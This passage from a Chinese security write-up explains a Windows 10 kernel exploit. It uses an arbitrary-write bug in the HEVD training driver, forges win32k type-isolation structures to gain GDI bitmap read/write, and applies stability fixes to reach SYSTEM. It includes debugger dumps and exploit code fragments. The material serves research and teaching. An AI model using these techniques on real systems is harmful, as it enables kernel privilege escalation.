    kd> dq 1f0000//fake view
    00000000`001f0000  00000000`00000000 00000000`00000000
    00000000`001f0010  00000000`00000000 00000000`00000000
    kd> dq 190000//fake RTL_BITMAP
    00000000`00190000  00000000`000000f0 00000000`00190010
    00000000`00190010  00000000`00000000 00000000`00000000
    kd> dq 1c0000//fake CSectionBitmapAllocator
    00000000`001c0000  00000000`001e0000 deadbeef`deb2b33f
    00000000`001c0010  deadbeef`deadb33f deadbeef`deb4b33f
    00000000`001c0020  00000001`00000001 00000001`00000000
其中，0x1f0000指向view域，0x1c0000指向CSectionBitmapAllocator，fake view域将用于存放GDI
object，而CSectionBitmapAllocator中的结构需要精心构造，因为我们需要通过它来欺骗typeisolation认为我们可控的CSectionEntry是个空闲view项。
    typedef struct _CSECTIONBITMAPALLOCATOR {
    PVOID           pushlock;           // + 0x00
    ULONG64         xored_view;         // + 0x08
    ULONG64         xor_key;            // + 0x10
    ULONG64         xored_rtl_bitmap;   // + 0x18
    ULONG           bitmap_hint_index;  // + 0x20
    ULONG           num_commited_views; // + 0x24
    } CSECTIONBITMAPALLOCATOR, *PCSECTIONBITMAPALLOCATOR;
上述CSectionBitmapAllocator结构和0x1c0000处的结构对照，其中xor_key我定义为0xdeadbeefdeadb33f，只要保证xor_key
^ xor_view和xor_key ^
xor_rtl_bitmap运算之后指向view域和RTL_BITMAP即可，在调试的过程中我发现pushlock必须是指向有效结构的指针，否则会触发BUGCHECK，因此我申请了0x1e0000用于存放pushlock的内容。
如第二节所述，bitmap_hint_index会作为快速查找RTL_BITMAP的条件，因此这个值也需要置为空值表示RTL_BITMAP的状态。同理我们来看一下RTL_BITMAP的结构。
    typedef struct _RTL_BITMAP {
    ULONG64         size;               // + 0x00
    PVOID           bitmap_buffer;      // + 0x08
    } RTL_BITMAP, *PRTL_BITMAP;
    kd> dyb fffff322401b90b0
    76543210 76543210 76543210 76543210
    -------- -------- -------- --------    
    fffff322`401b90b0  11110000 00000000 00000000 00000000  f0 00 00 00
    fffff322`401b90b4  00000000 00000000 00000000 00000000  00 00 00 00
    fffff322`401b90b8  11000000 10010000 00011011 01000000  c0 90 1b 40
    fffff322`401b90bc  00100010 11110011 11111111 11111111  22 f3 ff ff
    fffff322`401b90c0  11111111 11111111 11111111 11111111  ff ff ff ff
    fffff322`401b90c4  11111111 11111111 11111111 11111111  ff ff ff ff
    fffff322`401b90c8  11111111 11111111 11111111 11111111  ff ff ff ff
    fffff322`401b90cc  11111111 11111111 11111111 11111111  ff ff ff ff
    kd> dq fffff322401b90b0
    fffff322`401b90b0  00000000`000000f0 fffff322`401b90c0//ptr to rtl_bitmap buffer
    fffff322`401b90c0  ffffffff`ffffffff ffffffff`ffffffff
    fffff322`401b90d0  ffffffff`ffffffff
这里我选取了一个有效的RTL_BITMAP作为模板，其中第一个成员变量表示RTL_BITMAP
size，第二个成员变量指向后面的bitmap_buffer，而紧邻的bitmap_buffer以比特为单位表示view域状态，我们为了欺骗typeisolation，将其全部置0，表示当前CSectionEntry项的view域全部空闲，参考0x190000
fake RTL_BITMAP结构。
接下来我们只需要通过HEVD的Arbitrary
write漏洞修改CSectionEntry中view和CSectionBitmapAllocator指针即可。
    kd> dq ffff862e827ca220//正常时
    ffff862e`827ca220  ffff862e`827cf4f0 ffff862e`827ef300
    ffff862e`827ca230  ffffc383`08613880 ffff862e`84780000
    ffff862e`827ca240  ffff862e`827f33c0 00000000`00000000
    kd> g//触发漏洞后，CSectionEntry-&gt;view和CSectionEntry-&gt;bitmap_allocator被修改
    Break instruction exception - code 80000003 (first chance)
    0033:00007ff7`abc21e35 cc              int     3
    kd> dq ffff862e827ca220
    ffff862e`827ca220  ffff862e`827cf4f0 ffff862e`827ef300
    ffff862e`827ca230  ffffc383`08613880 00000000`001f0000
    ffff862e`827ca240  00000000`001c0000 00000000`00000000
接下来我们正常申请一个GDI object，调用CreateBitmap创建一个bitmap object，然后观察view域的状态。
    kd> g
    Break instruction exception - code 80000003 (first chance)
    0033:00007ff7`abc21ec8 cc              int     3
    kd> dq 1f0280
    00000000`001f0280  00000000`00051a2e 00000000`00000000
    00000000`001f0290  ffffd40a`cc9fd700 00000000`00000000
    00000000`001f02a0  00000000`00051a2e 00000000`00000000
    00000000`001f02b0  00000000`00000000 00000002`00000040
    00000000`001f02c0  00000000`00000080 ffff862e`8277da30
    00000000`001f02d0  ffff862e`8277da30 00003f02`00000040
    00000000`001f02e0  00010000`00000003 00000000`00000000
    00000000`001f02f0  00000000`04800200 00000000`00000000
可以看到bitmap的kernel object被放置在了fake view域中，我们可以直接从userspace读到bitmap的kernel
object，接下来，我们只需要直接通过修改userspace中存放的bitmap kernel
object的pvScan0，再通过GetBitmapBits/SetBitmapBits来完成任意地址读写。
总结一下整个利用过程：
**Fix for full exploit：**
在完成exploit的过程中，我发现了某些时候会产生BSOD，这大大降低了GDI data-only attack的稳定性，比如说
    kd> !analyze -v
    *******************************************************************************
    *                                                                             *
    *                        Bugcheck Analysis                                    *
    *                                                                             *
    *******************************************************************************
    SYSTEM_SERVICE_EXCEPTION (3b)
    An exception happened while executing a system service routine.
    Arguments:
    Arg1: 00000000c0000005, Exception code that caused the bugcheck
    Arg2: ffffd7d895bd9847, Address of the instruction which caused the bugcheck
    Arg3: ffff8c8f89e98cf0, Address of the context record for the exception that caused the bugcheck
    Arg4: 0000000000000000, zero.
    Debugging Details:
    ------------------    
    OVERLAPPED_MODULE: Address regions for 'dxgmms1' and 'dump_storport.sys' overlap
    EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - 0x%08lx
    FAULTING_IP:
    win32kbase!NSInstrumentation::CTypeIsolation::AllocateType+47
    ffffd7d8`95bd9847 488b1e          mov     rbx,qword ptr [rsi]
    CONTEXT:  ffff8c8f89e98cf0 -- (.cxr 0xffff8c8f89e98cf0)
    .cxr 0xffff8c8f89e98cf0
    rax=ffffdb0039e7c080 rbx=ffffd7a7424e4e00 rcx=ffffdb0039e7c080
    rdx=ffffd7a7424e4e00 rsi=00000000001e0000 rdi=ffffd7a740000660
    rip=ffffd7d895bd9847 rsp=ffff8c8f89e996e0 rbp=0000000000000000
    r8=ffff8c8f89e996b8  r9=0000000000000001 r10=7ffffffffffffffc
    r11=0000000000000027 r12=00000000000000ea r13=ffffd7a740000680
    r14=ffffd7a7424dca70 r15=0000000000000027
    iopl=0         nv up ei pl nz na po nc
    cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
    win32kbase!NSInstrumentation::CTypeIsolation::AllocateType+0x47:
    ffffd7d8`95bd9847 488b1e          mov     rbx,qword ptr [rsi] ds:002b:00000000`001e0000=????????????????
经过多次跟踪后我发现，BSOD产生的原因主要是我们通过VirtualAllocEx时申请的fake
struct位于我们当前进程的进程空间，这个空间不被其他进程共享，也就是说，如果我们通过漏洞修改了view域和CSectionBitmapAllocator的指针之后，当其他进程申请GDI
object时，同样会遍历CSecitionEntry，当遍历到我们通过漏洞修改的CSectionEntry时，会因为指向进程地址空间无效，产生BSoD，所以这里当触发漏洞之后我做了第一次fix。
    DWORD64 fix_bitmapbits1 = 0xffffffffffffffff;
    DWORD64 fix_bitmapbits2 = 0xffffffffffff;
    DWORD64 fix_number = 0x2800000000;
    CopyMemory((void *)(fakertl_bitmap + 0x10), &fix_bitmapbits1, 0x8);
    CopyMemory((void *)(fakertl_bitmap + 0x18), &fix_bitmapbits1, 0x8);
    CopyMemory((void *)(fakertl_bitmap + 0x20), &fix_bitmapbits1, 0x8);
    CopyMemory((void *)(fakertl_bitmap + 0x28), &fix_bitmapbits2, 0x8);
    CopyMemory((void *)(fakeallocator + 0x20), &fix_number, 0x8);
在第一个fix中，我修改了bitmap_hint_index和rtl_bitmap，欺骗typeisolation在遍历CSectionEntry的时候认为fake
CSectionEntry的view域目前已被占满，就会直接跳过这个CSectionEntry。
我们知道当前的CSectionEntry已经被我们修改，因此即使我们结束了exploit退出进程后CSectionEntry仍然会作为CTypeIsolation双向链表的一部分，而我们进程退出时，VirtualAllocEx申请的当前进程用户空间会被释放掉，这就会引发很多未知的错误，而我们已经通过漏洞拥有了任意地址读写的能力，于是我进行了第二次fix。
    ArbitraryRead(bitmap, fakeview + 0x280 + 0x48, CSectionEntryKernelAddress + 0x8, (BYTE *)&amp;CSectionPrevious, sizeof(DWORD64));
    ArbitraryRead(bitmap, fakeview + 0x280 + 0x48, CSectionEntryKernelAddress, (BYTE *)&amp;CSectionNext, sizeof(DWORD64));
    LogMessage(L_INFO, L"Current CSectionEntry-&gt;previous: 0x%p", CSectionPrevious);
    LogMessage(L_INFO, L"Current CSectionEntry-&gt;next: 0x%p", CSectionNext);
    ArbitraryWrite(bitmap, fakeview + 0x280 + 0x48, CSectionNext + 0x8, (BYTE *)&amp;CSectionPrevious, sizeof(DWORD64));
    ArbitraryWrite(bitmap, fakeview + 0x280 + 0x48, CSectionPrevious, (BYTE *)&amp;CSectionNext, sizeof(DWORD64));
第二次fix中，我获取了CSectionEntry->previous和CSectionEntry->next，将当前CSectionEntry脱链(unlink)，这样在GDI
object分配遍历CSectionEntry时，就不会再对fake CSectionEntry处理。
当完成这两个fix之后，就可以成功利用GDI data-only attack完成任意地址读写了，这里我直接获取到了最新版Windows10
rs3的SYSTEM权限，但是在进程完全退出的时候却再一次引发了BSoD。经过分析发现，这个BSoD是由于进行了unlink之后，由于GDI的句柄保存在GDI
handle table中，这时会去CSectionEntry中找到对应内核对象并free掉，而我们存放bitmap kernel
object的CSectionEntry已经被unlink，引发了BSoD的发生。
问题发生在NtGdiCloseProcess中，该函数负责释放当前进程的GDI object，跟SURFACE相关的调用链如下
    0e ffff858c`8ef77300 ffff842e`52a57244 win32kbase!SURFACE::bDeleteSurface+0x7ef
    0f ffff858c`8ef774d0 ffff842e`52a1303f win32kbase!SURFREF::bDeleteSurface+0x14
    10 ffff858c`8ef77500 ffff842e`52a0cbef win32kbase!vCleanupSurfaces+0x87
    11 ffff858c`8ef77530 ffff842e`52a0c804 win32kbase!NtGdiCloseProcess+0x11f
bDeleteSurface负责释放Gdi handle table中的SURFACE内核对象，我们需要在GDI handle
table中找到存放在fake
view中的HBITMAP，并且将其置0，这样就会在bDeleteSurface中不进行后续的free处理，直接跳过再调用HmgNextOwned释放下一个GDI
object。关于查找HBITMAP在GDI handle table中的位置的关键代码在HmgSharedLockCheck中，其关键代码如下：
    v4 = *(_QWORD *)(*(_QWORD *)(**(_QWORD **)(v10 + 24) + 8 * ((unsigned __int64)(unsigned int)v6 >> 8)) + 16i64 * (unsigned __int8)v6 + 8);
这里我还原了一个完整的查找bitmap对象的计算方法：
    *(*(*(*(*win32kbase!gpHandleManager+10)+8)+18)+(hbitmap&0xffff>>8)*8)+hbitmap&0xff*2*8
值得一提的是这里需要泄露win32kbase.sys的基址，在Low IL的情况下需要漏洞来leak info，我是通过在Medium
IL下用NtQuerySystemInformation泄露win32kbase.sys基址从而计算出gpHandleManager的地址，之后找到fake
view中bitmap在Gdi handle table中的对象位置，并置0，最后完成了full exploit。
现在内核利用越来越难，一个漏洞往往需要其他漏洞的支持，比如info leak。而相比越界写，uaf，double free和write-what-where这几种漏洞，pool
overflow在使用这种方案利用上更为复杂，因为涉及到CSectionEntry->previous和CSectionEntry->next的问题，但并不是不可能在pool
overflow中使用这种方法。
作者水平有限，如果有问题欢迎交流讨论，谢谢！
## 五、参考